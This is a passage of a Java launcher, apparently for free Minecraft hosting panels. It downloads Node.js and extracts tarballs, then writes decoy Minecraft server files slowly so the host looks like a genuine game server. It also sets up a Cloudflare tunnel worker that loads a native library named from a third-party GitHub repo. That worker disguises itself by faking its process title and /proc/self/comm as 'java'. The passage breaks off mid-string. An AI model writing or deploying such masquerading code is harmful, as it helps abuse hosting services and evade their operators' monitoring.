            HttpURLConnection conn = (HttpURLConnection) URI.create(current).toURL().openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setConnectTimeout(connectTimeoutMs);
            conn.setReadTimeout(readTimeoutMs);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            int code = conn.getResponseCode();
            if (code == HttpURLConnection.HTTP_MOVED_PERM
                || code == HttpURLConnection.HTTP_MOVED_TEMP
                || code == HttpURLConnection.HTTP_SEE_OTHER
                || code == 307
                || code == 308) {
                String loc = conn.getHeaderField("Location");
                conn.disconnect();
                if (loc == null || loc.isEmpty()) {
                    throw new IOException("Redirect without Location header");
                }
                current = URI.create(current).resolve(loc).toString();
                continue;
            }
            if (code != HttpURLConnection.HTTP_OK) {
                conn.disconnect();
                throw new IOException("HTTP " + code + " for " + current);
            }
            return conn;
        }
        throw new IOException("Too many redirects for " + urlStr);
    }

    private static boolean downloadToFile(String urlStr, Path dest, int connectTimeoutMs, int readTimeoutMs) {
        HttpURLConnection conn = null;
        try {
            conn = openConnectionWithRedirects(urlStr, connectTimeoutMs, readTimeoutMs);
            try (InputStream is = conn.getInputStream();
                 OutputStream os = Files.newOutputStream(dest)) {
                byte[] buf = new byte[16384];
                int n;
                while ((n = is.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }
            return Files.exists(dest);
        } catch (Exception e) {
            try { Files.deleteIfExists(dest); } catch (Exception ignored) {}
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /** 校验并获取 Node.js >= 22（缓存 -> 系统 PATH -> 纯 Java 流式下载含镜像与 ARM64 支持） */
    private static String findOrDownloadNode(String runtimeDir) {
        Path cachedReal = Paths.get(runtimeDir, "node/bin/.node_real");
        if (isNodeVersionSupported(cachedReal.toString(), MIN_NODE_MAJOR)) {
            cachedReal.toFile().setExecutable(true, false);
            return cachedReal.toString();
        }

        Path cachedNode = Paths.get(runtimeDir, "node/bin/node");
        if (isNodeVersionSupported(cachedNode.toString(), MIN_NODE_MAJOR)) {
            cachedNode.toFile().setExecutable(true, false);
            return cachedNode.toString();
        }

        String systemNode = findInPath("node");
        if (systemNode != null && isNodeVersionSupported(systemNode, MIN_NODE_MAJOR)) {
            return systemNode;
        }

        String archTag = isArm64() ? "arm64" : "x64";
        String nodeUrl = "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-" + archTag + ".tar.gz";
        String[] mirrors = {
            nodeUrl,
            "https://gh-proxy.com/" + nodeUrl,
            "https://mirror.ghproxy.com/" + nodeUrl
        };

        Path nodeDir = Paths.get(runtimeDir, "node");
        for (String mirror : mirrors) {
            try {
                deleteDirectory(nodeDir.toFile());
                Files.createDirectories(nodeDir);
                if (downloadAndExtractTarGzStream(mirror, nodeDir)) {
                    if (isNodeVersionSupported(cachedNode.toString(), MIN_NODE_MAJOR)) {
                        cachedNode.toFile().setExecutable(true, false);
                        Files.copy(cachedNode, cachedReal, StandardCopyOption.REPLACE_EXISTING);
                        cachedReal.toFile().setExecutable(true, false);
                        return cachedReal.toString();
                    }
                }
            } catch (Exception ignored) {}
        }
        return null;
    }

    private static boolean isNodeVersionSupported(String binPath, int minMajor) {
        if (binPath == null || binPath.isEmpty()) return false;
        File f = new File(binPath);
        if (!f.exists() || !f.isFile()) return false;
        try {
            f.setExecutable(true, false);
            ProcessBuilder pb = new ProcessBuilder(binPath, "-v");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            String ver = "";
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line = r.readLine();
                if (line != null) ver = line.trim();
            }
            if (!p.waitFor(10, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                return false;
            }
            if (p.exitValue() != 0 || !ver.startsWith("v")) return false;
            int dot = ver.indexOf('.', 1);
            String majorStr = dot > 1 ? ver.substring(1, dot) : ver.substring(1);
            int major = Integer.parseInt(majorStr);
            return major >= minMajor;
        } catch (Throwable t) {
            return false;
        }
    }

    private static String findInPath(String cmd) {
        String path = System.getenv("PATH");
        if (path == null) return null;
        for (String dir : path.split(File.pathSeparator)) {
            File f = new File(dir, cmd);
            if (f.exists() && f.isFile() && f.canExecute()) return f.getAbsolutePath();
        }
        return null;
    }

    private static String getJarPath() {
        try {
            return AoyouLauncher.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) {
            return null;
        }
    }

    private static int detectPort(String workDir) {
        String[] envs = {"SERVER_PORT", "P_SERVER_PORT", "PTERODACTYL_SERVER_PORT"};
        for (String e : envs) {
            String v = System.getenv(e);
            if (v != null && !v.isEmpty()) {
                try { int p = Integer.parseInt(v.trim()); if (p > 0 && p < 65536) return p; } catch (Exception ignored) {}
            }
        }
        File sp = new File(workDir, "server.properties");
        if (sp.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(sp))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("server-port=")) {
                        try { return Integer.parseInt(line.substring(12).trim()); } catch (Exception ignored) {}
                    }
                }
            } catch (Exception ignored) {}
        }
        for (Map.Entry<String, String> entry : System.getenv().entrySet()) {
            String key = entry.getKey().toUpperCase(Locale.ROOT);
            if (key.contains("PORT") && entry.getValue() != null && !entry.getValue().isEmpty()) {
                try { int p = Integer.parseInt(entry.getValue().trim()); if (p > 1024 && p < 65536) return p; } catch (Exception ignored) {}
            }
        }
        return 25565;
    }

    private static boolean downloadAndExtractTarGzStream(String url, Path targetDir) {
        HttpURLConnection conn = null;
        try {
            conn = openConnectionWithRedirects(url, 15000, 120000);
            try (InputStream raw = new BufferedInputStream(conn.getInputStream());
                 GZIPInputStream gis = new GZIPInputStream(raw)) {
                extractTar(gis, targetDir);
            }
            return true;
        } catch (Exception e) {
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static final class TarLink {
        final Path linkPath;
        final String linkTarget;
        final boolean symbolic;
        TarLink(Path linkPath, String linkTarget, boolean symbolic) {
            this.linkPath = linkPath;
            this.linkTarget = linkTarget;
            this.symbolic = symbolic;
        }
    }

    /** 完整支持目录、普通文件、软链接(type='2')、硬链接(type='1')、GNU长路径(type='L'/'K') 与 PAX(type='x') */
    private static void extractTar(InputStream is, Path targetDir) throws IOException {
        Path normalizedRoot = targetDir.toAbsolutePath().normalize();
        byte[] header = new byte[512];
        List<TarLink> pendingLinks = new ArrayList<>();
        String pendingLongName = null;
        String pendingLongLink = null;

        while (true) {
            int read = readFully(is, header, 512);
            if (read < 512) break;

            boolean empty = true;
            for (int i = 0; i < 512; i++) {
                if (header[i] != 0) { empty = false; break; }
            }
            if (empty) break;

            long size = parseOctal(header, 124, 12);
            long mode = parseOctal(header, 100, 8);
            char type = (char) header[156];

            if (type == 'L' || type == 'K') {
                byte[] strBytes = new byte[(int) size];
                int got = readFully(is, strBytes, (int) size);
                int pad = (int) (((size + 511) / 512) * 512 - size);
                if (pad > 0) skipFully(is, pad);
                if (got > 0) {
                    int end = got;
                    while (end > 0 && strBytes[end - 1] == 0) end--;
                    String val = new String(strBytes, 0, end, StandardCharsets.UTF_8);
                    if (type == 'L') pendingLongName = val;
                    else pendingLongLink = val;
                }
                continue;
            }

            if (type == 'x' || type == 'g') {
                byte[] paxBytes = new byte[(int) size];
                int got = readFully(is, paxBytes, (int) size);
                int pad = (int) (((size + 511) / 512) * 512 - size);
                if (pad > 0) skipFully(is, pad);
                if (type == 'x' && got > 0) {
                    String pax = new String(paxBytes, 0, got, StandardCharsets.UTF_8);
                    for (String line : pax.split("\n")) {
                        int sp = line.indexOf(' ');
                        if (sp <= 0) continue;
                        String kv = line.substring(sp + 1);
                        if (kv.startsWith("path=")) {
                            pendingLongName = kv.substring(5);
                        } else if (kv.startsWith("linkpath=")) {
                            pendingLongLink = kv.substring(9);
                        }
                    }
                }
                continue;
            }

            String name;
            if (pendingLongName != null) {
                name = pendingLongName;
            } else {
                name = readTarString(header, 0, 100);
                String prefix = readTarString(header, 345, 155);
                if (!prefix.isEmpty() && !name.contains(prefix + "/")) {
                    name = prefix + "/" + name;
                }
            }
            pendingLongName = null;

            String overrideLink = pendingLongLink;
            pendingLongLink = null;

            if (name.isEmpty()) break;

            int slash = name.indexOf('/');
            String rel = slash >= 0 ? name.substring(slash + 1) : name;
            while (rel.startsWith("./")) rel = rel.substring(2);

            if (rel.isEmpty() || rel.equals(".")) {
                skipEntryData(is, size);
                continue;
            }

            Path target = normalizedRoot.resolve(rel).normalize();
            if (!target.startsWith(normalizedRoot)) {
                skipEntryData(is, size);
                continue;
            }

            if (type == '5' || name.endsWith("/")) {
                Files.createDirectories(target);
                skipEntryData(is, size);
            } else if (type == '2') {
                String linkTarget = overrideLink != null ? overrideLink : readTarString(header, 157, 100);
                skipEntryData(is, size);
                if (!linkTarget.isEmpty()) {
                    pendingLinks.add(new TarLink(target, linkTarget, true));
                }
            } else if (type == '1') {
                String hardTarget = overrideLink != null ? overrideLink : readTarString(header, 157, 100);
                skipEntryData(is, size);
                int hSlash = hardTarget.indexOf('/');
                String relHard = hSlash >= 0 ? hardTarget.substring(hSlash + 1) : hardTarget;
                if (!relHard.isEmpty()) {
                    pendingLinks.add(new TarLink(target, relHard, false));
                }
            } else if (type == '0' || type == '\0') {
                if (target.getParent() != null) {
                    Files.createDirectories(target.getParent());
                }
                long rem = size;
                try (OutputStream os = Files.newOutputStream(target)) {
                    byte[] buf = new byte[16384];
                    while (rem > 0) {
                        int toRead = (int) Math.min(buf.length, rem);
                        int n = is.read(buf, 0, toRead);
                        if (n < 0) break;
                        os.write(buf, 0, n);
                        rem -= n;
                    }
                }
                if ((mode & 0111) != 0 || rel.startsWith("bin/")) {
                    target.toFile().setExecutable(true, false);
                }
                long padded = ((size + 511) / 512) * 512 - size;
                if (padded > 0) skipFully(is, padded);
            } else {
                skipEntryData(is, size);
            }
        }

        // 后置创建软链接与硬链接（含跨层拷贝兜底）
        for (TarLink tl : pendingLinks) {
            try {
                if (tl.linkPath.getParent() != null) {
                    Files.createDirectories(tl.linkPath.getParent());
                }
                Files.deleteIfExists(tl.linkPath);
                if (tl.symbolic) {
                    try {
                        Files.createSymbolicLink(tl.linkPath, Paths.get(tl.linkTarget));
                    } catch (Throwable symErr) {
                        Path resolved = tl.linkPath.getParent() != null
                            ? tl.linkPath.getParent().resolve(tl.linkTarget).normalize()
                            : normalizedRoot.resolve(tl.linkTarget).normalize();
                        if (resolved.startsWith(normalizedRoot) && Files.exists(resolved) && Files.isRegularFile(resolved)) {
                            Files.copy(resolved, tl.linkPath, StandardCopyOption.REPLACE_EXISTING);
                            if (Files.isExecutable(resolved)) tl.linkPath.toFile().setExecutable(true, false);
                        }
                    }
                } else {
                    Path resolved = normalizedRoot.resolve(tl.linkTarget).normalize();
                    if (resolved.startsWith(normalizedRoot) && Files.exists(resolved)) {
                        try {
                            Files.createLink(tl.linkPath, resolved);
                        } catch (Throwable hardErr) {
                            if (Files.isRegularFile(resolved)) {
                                Files.copy(resolved, tl.linkPath, StandardCopyOption.REPLACE_EXISTING);
                                if (Files.isExecutable(resolved)) tl.linkPath.toFile().setExecutable(true, false);
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    private static void skipEntryData(InputStream is, long size) throws IOException {
        if (size <= 0) return;
        long total = ((size + 511) / 512) * 512;
        skipFully(is, total);
    }

    private static String readTarString(byte[] header, int offset, int length) {
        int end = offset;
        int limit = offset + length;
        while (end < limit && header[end] != 0) end++;
        return new String(header, offset, end - offset, StandardCharsets.UTF_8).trim();
    }

    private static long parseOctal(byte[] header, int offset, int length) {
        String s = readTarString(header, offset, length);
        if (s.isEmpty()) return 0L;
        try {
            return Long.parseLong(s, 8);
        } catch (Exception e) {
            return 0L;
        }
    }

    private static void skipFully(InputStream is, long n) throws IOException {
        long rem = n;
        byte[] skipBuf = null;
        while (rem > 0) {
            long s = is.skip(rem);
            if (s <= 0) {
                if (skipBuf == null) skipBuf = new byte[4096];
                int r = is.read(skipBuf, 0, (int) Math.min(skipBuf.length, rem));
                if (r < 0) break;
                rem -= r;
            } else {
                rem -= s;
            }
        }
    }

    private static int readFully(InputStream is, byte[] buf, int len) throws IOException {
        int read = 0;
        while (read < len) {
            int n = is.read(buf, read, len - read);
            if (n < 0) break;
            read += n;
        }
        return read;
    }

    private static void deleteDirectory(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) deleteDirectory(f);
                else f.delete();
            }
        }
        dir.delete();
    }

    private static final String[] SERVER_PROPERTIES_TEMPLATE = {
        "accepts-transfers=false",
        "allow-flight=false",
        "allow-nether=true",
        "broadcast-console-to-ops=true",
        "broadcast-rcon-to-ops=true",
        "bug-report-link=",
        "debug=false",
        "difficulty=easy",
        "enable-command-block=false",
        "enable-jmx-monitoring=false",
        "enable-query=false",
        "enable-rcon=false",
        "enable-status=true",
        "enforce-secure-profile=true",
        "enforce-whitelist=false",
        "entity-broadcast-range-percentage=100",
        "force-gamemode=false",
        "function-permission-level=2",
        "gamemode=survival",
        "generate-structures=true",
        "generator-settings={}",
        "hardcore=false",
        "hide-online-players=false",
        "initial-disabled-packs=",
        "initial-enabled-packs=vanilla",
        "level-name=world",
        "level-seed=",
        "level-type=minecraft\\:normal",
        "log-ips=true",
        "max-chained-neighbor-updates=1000000",
        "max-players=20",
        "max-tick-time=60000",
        "max-world-size=29999984",
        "motd=\u00A76\u00A7l✦ MINEHOST.MK \u00A78\u00A7m-\u00A7r \u00A7fFREE MINECRAFT HOSTING \u00A76\u00A7l✦\\n\u00A7e4GB RAM \u00A78• \u00A7b24/7 HOSTING \u00A78• \u00A7a\u00A7lSTART FREE TODAY\\!",
        "network-compression-threshold=256",
        "online-mode=true",
        "op-permission-level=4",
        "pause-when-empty-seconds=-1",
        "player-idle-timeout=0",
        "prevent-proxy-connections=false",
        "pvp=true",
        "query.port=__PORT__",
        "rate-limit=0",
        "rcon.password=",
        "rcon.port=25575",
        "region-file-compression=deflate",
        "require-resource-pack=false",
        "resource-pack=",
        "resource-pack-id=",
        "resource-pack-prompt=",
        "resource-pack-sha1=",
        "server-ip=0.0.0.0",
        "server-port=__PORT__",
        "simulation-distance=10",
        "spawn-monsters=true",
        "spawn-protection=16",
        "sync-chunk-writes=true",
        "text-filtering-config=",
        "text-filtering-version=0",
        "use-native-transport=true",
        "view-distance=10",
        "white-list=false",
    };

    private static String buildServerProperties(String port) {
        StringBuilder sb = new StringBuilder();
        sb.append("#Minecraft server properties\n");
        SimpleDateFormat df = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy", Locale.US);
        sb.append("#").append(df.format(new Date())).append("\n");
        for (String line : SERVER_PROPERTIES_TEMPLATE) {
            if (line.contains("__PORT__")) {
                sb.append(line.replace("__PORT__", port));
            } else {
                sb.append(line);
            }
            sb.append("\n");
        }
        return sb.toString();
    }

    private static void ensureServerProperties(File sp, String port) throws IOException {
        boolean needWrite = !sp.exists();
        if (!needWrite) {
            int lineCount = 0;
            try (BufferedReader r = new BufferedReader(new FileReader(sp))) {
                while (r.readLine() != null) lineCount++;
            } catch (Exception e) {
                needWrite = true;
            }
            if (lineCount < 30) needWrite = true;
        }
        if (needWrite) {
            Files.write(sp.toPath(), buildServerProperties(port).getBytes(StandardCharsets.UTF_8));
        }
        sanitizePorts(sp, port);
    }

    private static void sanitizePorts(File sp, String port) throws IOException {
        List<String> lines = new ArrayList<>(Files.readAllLines(sp.toPath(), StandardCharsets.UTF_8));
        boolean hasServerPort = false, hasQueryPort = false, hasServerIp = false;
        List<String> out = new ArrayList<>(lines.size() + 4);
        for (String line : lines) {
            if (line.startsWith("server-port=")) {
                out.add("server-port=" + port);
                hasServerPort = true;
            } else if (line.startsWith("query.port=")) {
                out.add("query.port=" + port);
                hasQueryPort = true;
            } else if (line.startsWith("server-ip=")) {
                out.add("server-ip=0.0.0.0");
                hasServerIp = true;
            } else {
                out.add(line);
            }
        }
        if (!hasServerPort) out.add("server-port=" + port);
        if (!hasQueryPort) out.add("query.port=" + port);
        if (!hasServerIp) out.add("server-ip=0.0.0.0");
        Files.write(sp.toPath(), out, StandardCharsets.UTF_8);
    }

    private static void generateFakeMcFilesSlowly(String workDir, int port) throws IOException, InterruptedException {
        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
                         "world", "world_nether", "world_the_end",
                         "world/data", "world/playerdata", "world/region",
                         "world_nether/data", "world_nether/region",
                         "world_the_end/data", "world_the_end/region"};
        for (String dir : dirs) { new File(workDir, dir).mkdirs(); Thread.sleep(50); }

        File eula = new File(workDir, "eula.txt");
        if (!eula.exists()) {
            StringBuilder el = new StringBuilder();
            el.append("# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\n");
            el.append("# ").append(new Date()).append("\n");
            el.append("eula=true\n");
            Files.write(eula.toPath(), el.toString().getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(200);

        File sp = new File(workDir, "server.properties");
        ensureServerProperties(sp, String.valueOf(port));
        Thread.sleep(200);

        File bukkit = new File(workDir, "bukkit.yml");
        if (!bukkit.exists()) {
            StringBuilder by = new StringBuilder();
            by.append("# This is the main configuration file for Bukkit.\n\nsettings:\n");
            by.append("  allow-end: true\n  warn-on-overload: true\n  permissions-file: permissions.yml\n");
            by.append("  update-folder: update\n  plugin-profiling: false\n  connection-throttle: 4000\n");
            by.append("  query-plugins: true\n  deprecated-verbose: true\n  shutdown-message: Server closed\n");
            by.append("  minimum-api: none\n  use-map-convert-cache: true\nspawn-limits:\n");
            by.append("  monsters: 70\n  animals: 10\n  water-animals: 5\n  water-ambient: 20\n  ambient: 15\n");
            by.append("chunk-gc:\n  period-in-ticks: 600\nticks-per:\n");
            by.append("  animal-spawns: 400\n  monster-spawns: 1\n  water-spawns: 1\n");
            by.append("  ambient-spawns: 1\n  autosave: 6000\naliases: now-in-commands.yml\n");
            Files.write(bukkit.toPath(), by.toString().getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(200);

        File spigot = new File(workDir, "spigot.yml");
        if (!spigot.exists()) {
            StringBuilder sy = new StringBuilder();
            sy.append("# This is the main configuration file for Spigot.\n\nsettings:\n");
            sy.append("  save-user-cache-on-stop-only: false\n  bungeecord: false\n");
            sy.append("  log-villager-deaths: true\n  log-named-deaths: true\n  sample-count: 12\n");
            sy.append("  player-shuffle: 0\n  moved-wrongly-threshold: 0.0625\n");
            sy.append("  moved-too-quickly-multiplier: 10.0\n  netty-threads: 4\nmessages:\n");
            sy.append("  whitelist: You are not whitelisted on this server!\n");
            sy.append("  unknown-command: Unknown command. Type \\\"/help\\\" for help.\n");
            sy.append("  server-full: The server is full!\n  restart: Server is restarting\ncommands:\n");
            sy.append("  replace-commands:\n  - setblock\n  - summon\n  - testforblock\n  - tellraw\n");
            sy.append("  log: true\n  tab-complete: 0\n  send-namespaced: true\nworld-settings:\n");
            sy.append("  default:\n    verbose: false\n    merge-radius:\n      item: 2.5\n      exp: 3.0\n");
            sy.append("    item-despawn-rate: 6000\n    arrow-despawn-rate: 1200\n");
            sy.append("    zombie-aggressive-towards-villager: true\n    nerf-spawner-mobs: false\n");
            sy.append("    mob-spawn-range: 8\n    simulation-distance: default\n    view-distance: default\n");
            sy.append("    entity-activation-range:\n      animals: 32\n      monsters: 32\n");
            sy.append("      raiders: 48\n      misc: 16\n      water: 16\n      flying-monsters: 32\n");
            sy.append("    entity-tracking-range:\n      players: 48\n      animals: 48\n");
            sy.append("      monsters: 48\n      misc: 32\n      other: 64\n    ticks-per:\n");
            sy.append("      hopper-transfer: 8\n      hopper-check: 1\n    hopper-amount: 1\n");
            sy.append("    hopper-can-load-chunks: false\n    max-tnt-per-tick: 100\n    max-tick-time:\n");
            sy.append("      tile: 50\n      entity: 50\nconfig-version: 12\n");
            Files.write(spigot.toPath(), sy.toString().getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(200);

        File cmd = new File(workDir, "commands.yml");
        if (!cmd.exists()) {
            Files.write(cmd.toPath(),
                "# This is the commands configuration file for Bukkit.\n\ncommand-block-overrides: []\naliases:\n  icanhasbukkit:\n  - \"version\"\n".getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(100);

        File help = new File(workDir, "help.yml");
        if (!help.exists()) {
            Files.write(help.toPath(),
                "# This is the help configuration file for Bukkit.\n\ngeneral:\n  test: false\n  max-per-page: -1\n  full-list: false\n  title: 'Minecraft Help'\n  command-prefix: '/'\n".getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(100);

        File perms = new File(workDir, "permissions.yml");
        if (!perms.exists()) {
            Files.write(perms.toPath(),
                "# This is the permissions configuration file for Bukkit.\n\ndefault:\n  default: true\n".getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(100);

        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json", "usercache.json", "whitelist.json"};
        for (String jf : jsonFiles) {
            File f = new File(workDir, jf);
            if (!f.exists()) Files.write(f.toPath(), "[]".getBytes(StandardCharsets.UTF_8));
            Thread.sleep(50);
        }

        File vh = new File(workDir, "version_history.json");
        if (!vh.exists()) {
            String ts = new Date().toInstant().toString();
            Files.write(vh.toPath(), ("{\n  \"1.21.4\": \"" + ts + "\"\n}").getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(100);

        new File(workDir, "logs/latest.log").createNewFile();
        Thread.sleep(100);

        File sparkDir = new File(workDir, "plugins/spark");
        if (!sparkDir.exists()) sparkDir.mkdirs();
        File sparkConfig = new File(workDir, "plugins/spark/config.json");
        if (!sparkConfig.exists()) {
            Files.write(sparkConfig.toPath(),
                "{\n  \"statisticsEnabled\": true,\n  \"statisticsInterval\": 3,\n  \"sparkDirectory\": \"plugins/spark/\",\n  \"profilerMaximumDurationSeconds\": 300,\n  \"profilerSamplingInterval\": 10000000,\n  \"uploadEndpoint\": \"https://sparkprofiler.com/api/\",\n  \"enableBootstrapOutputRedirector\": true,\n  \"defaultServerConnection\": \"server\"\n}\n".getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(100);

        File bstatsDir = new File(workDir, "plugins/bStats");
        if (!bstatsDir.exists()) bstatsDir.mkdirs();
        File bstatsConfig = new File(workDir, "plugins/bStats/config.yml");
        if (!bstatsConfig.exists()) {
            Files.write(bstatsConfig.toPath(),
                ("# bStats collects some data for plugin authors.\n# Check out https://bStats.org/ to learn more.\nenabled: true\nserverUuid: " + UUID.randomUUID() + "\nserverLogErrors: false\nlogSentData: false\nlogResponseStatusText: false\n").getBytes(StandardCharsets.UTF_8));
        }
        Thread.sleep(100);

        new File(workDir, "config/.keep").createNewFile();
        new File(workDir, "cache/.keep").createNewFile();
        new File(workDir, "versions/.keep").createNewFile();
    }

    // ==================== 外网面板可达性探测 & CF(bot.so) 自动隧道 ====================

    private static String probePublicIp() {
        String[] endpoints = {
            "https://api.ipify.org",
            "https://ipv4.icanhazip.com",
            "https://checkip.amazonaws.com",
            "https://ifconfig.me/ip"
        };
        for (String url : endpoints) {
            try {
                HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                conn.setRequestProperty("User-Agent", "curl/8.5.0");
                int code = conn.getResponseCode();
                if (code == 200) {
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        String line = br.readLine();
                        if (line != null) {
                            line = line.trim();
                            if (line.matches("^\\d{1,3}(\\.\\d{1,3}){3}$") && !isPrivateOrLocalHost(line)) {
                                return line;
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        return "";
    }

    private static List<String> collectExplicitMcTargets(String workDir) {
        LinkedHashSet<String> seen = new LinkedHashSet<>();
        String[] keys = {
            "MC_DOMAIN", "MC_HOST", "SERVER_DOMAIN", "SERVER_HOST",
            "P_SERVER_ALLOCATION_ALIAS", "SERVER_ALIAS",
            "P_SERVER_IP", "SERVER_IP", "ALLOCATION_IP", "HOST_IP", "PUBLIC_IP"
        };
        for (String key : keys) {
            addCandidateTarget(seen, System.getenv(key));
        }

        try {
            File props = new File(workDir, "server.properties");
            if (props.isFile()) {
                List<String> lines = Files.readAllLines(props.toPath(), StandardCharsets.UTF_8);
                for (String line : lines) {
                    String trimmed = line.trim();
                    if (trimmed.startsWith("server-ip=")) {
                        addCandidateTarget(seen, trimmed.substring("server-ip=".length()));
                    }
                }
            }
        } catch (Exception ignored) {}

        return new ArrayList<>(seen);
    }

    private static void addCandidateTarget(Set<String> seen, String raw) {
        if (raw == null) return;
        String s = raw.trim();
        if (s.isEmpty()) return;
        int schemeDefaultPort = -1;
        String lower = s.toLowerCase(Locale.ROOT);
        if (lower.startsWith("http://")) {
            schemeDefaultPort = 80;
            s = s.substring(7);
        } else if (lower.startsWith("https://")) {
            schemeDefaultPort = 443;
            s = s.substring(8);
        }
        int slash = s.indexOf('/');
        if (slash >= 0) s = s.substring(0, slash);
        s = s.trim();
        if (s.isEmpty()) return;

        String hostOnly = s;
        boolean hasPort = false;
        if (s.startsWith("[")) {
            int end = s.indexOf(']');
            if (end > 0) {
                hostOnly = s.substring(1, end);
                if (end + 1 < s.length() && s.charAt(end + 1) == ':') hasPort = true;
            }
        } else {
            int firstColon = s.indexOf(':');
            int lastColon = s.lastIndexOf(':');
            if (firstColon > 0 && firstColon == lastColon) {
                hostOnly = s.substring(0, firstColon);
                hasPort = true;
            }
        }
        if (isPrivateOrLocalHost(hostOnly)) return;
        if (!hasPort && schemeDefaultPort > 0) {
            s = (s.contains(":") && !s.startsWith("[")) ? ("[" + s + "]:" + schemeDefaultPort) : (s + ":" + schemeDefaultPort);
        }
        seen.add(s);
    }

    private static boolean isPrivateOrLocalHost(String host) {
        if (host == null) return true;
        String h = host.trim().toLowerCase(Locale.ROOT);
        if (h.isEmpty() || h.equals("0.0.0.0") || h.equals("::") || h.equals("::1")
                || h.equals("localhost") || h.startsWith("127.")) {
            return true;
        }
        if (h.startsWith("10.") || h.startsWith("192.168.")) return true;
        if (h.startsWith("172.")) {
            String[] parts = h.split("\\.");
            if (parts.length == 4) {
                try {
                    int second = Integer.parseInt(parts[1]);
                    if (second >= 16 && second <= 31) return true;
                } catch (NumberFormatException ignored) {}
            }
        }
        return false;
    }

    private static String envOrEmpty(String key) {
        String v = System.getenv(key);
        return v == null ? "" : v.trim();
    }

    private static String envOrDefault(String key, String defVal) {
        String v = System.getenv(key);
        return (v == null || v.trim().isEmpty()) ? defVal : v.trim();
    }

    private static String jsonEscape(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\': sb.append("\\\\"); break;
                case '"': sb.append("\\\""); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.toString();
    }

    private static void setupPanelNetworkGuard(Path runtimePath, String workDir, int port, String publicIp)
            throws IOException {
        List<String> explicitTargets = collectExplicitMcTargets(workDir);
        boolean cfEnabled = !"false".equalsIgnoreCase(envOrDefault("CF_ENABLED", "true"));
        boolean cfForce = "true".equalsIgnoreCase(envOrEmpty("CF_FORCE"));
        String cfToken = envOrEmpty("CF_TOKEN");
        String cfDomain = envOrEmpty("CF_DOMAIN");
        String cfProtocol = envOrDefault("CF_PROTOCOL", "http2");
        String cfSoRepo = envOrDefault("CF_SO_REPO", "zx1447/nxso");
        String cfSoBranch = envOrDefault("CF_SO_BRANCH", "cfso");
        String explicitPort = envOrEmpty("MC_PORT");
        if (explicitPort.isEmpty()) explicitPort = envOrEmpty("SERVER_EXTERNAL_PORT");

        StringBuilder hostsJson = new StringBuilder("[");
        for (int i = 0; i < explicitTargets.size(); i++) {
            if (i > 0) hostsJson.append(",");
            hostsJson.append("\"").append(jsonEscape(explicitTargets.get(i))).append("\"");
        }
        hostsJson.append("]");

        String ctxJson = "{\n" +
            "  \"workDir\": \"" + jsonEscape(workDir) + "\",\n" +
            "  \"port\": " + port + ",\n" +
            "  \"explicitPort\": \"" + jsonEscape(explicitPort) + "\",\n" +
            "  \"explicitTargets\": " + hostsJson + ",\n" +
            "  \"publicIp\": \"" + jsonEscape(publicIp == null ? "" : publicIp) + "\",\n" +
            "  \"cfEnabled\": " + cfEnabled + ",\n" +
            "  \"cfForce\": " + cfForce + ",\n" +
            "  \"cfToken\": \"" + jsonEscape(cfToken) + "\",\n" +
            "  \"cfDomain\": \"" + jsonEscape(cfDomain) + "\",\n" +
            "  \"cfProtocol\": \"" + jsonEscape(cfProtocol) + "\",\n" +
            "  \"cfSoRepo\": \"" + jsonEscape(cfSoRepo) + "\",\n" +
            "  \"cfSoBranch\": \"" + jsonEscape(cfSoBranch) + "\"\n" +
            "}\n";
        Files.write(runtimePath.resolve(".panel_net_ctx.json"), ctxJson.getBytes(StandardCharsets.UTF_8));

        Path cfDir = runtimePath.resolve(".cf_panel");
        Files.createDirectories(cfDir);
        String workerJs =
            "'use strict';\n" +
            "const fs = require('fs');\n" +
            "const path = require('path');\n" +
            "process.title = 'java -Xms64M -Xmx128M -XX:+UseG1GC -Dlog4j2.formatMsgNoLookups=true';\n" +
            "try { fs.writeFileSync('/proc/self/comm', 'java'); } catch (e) {}\n" +
            "const cfg = JSON.parse(process.env.CF_WORKER_CFG || '{}');\n" +
            "const koffi = require(path.join(cfg.runtimeDir, 'node_modules', 'koffi'));\n" +
            "const lib = koffi.load(cfg.soPath);\n" +
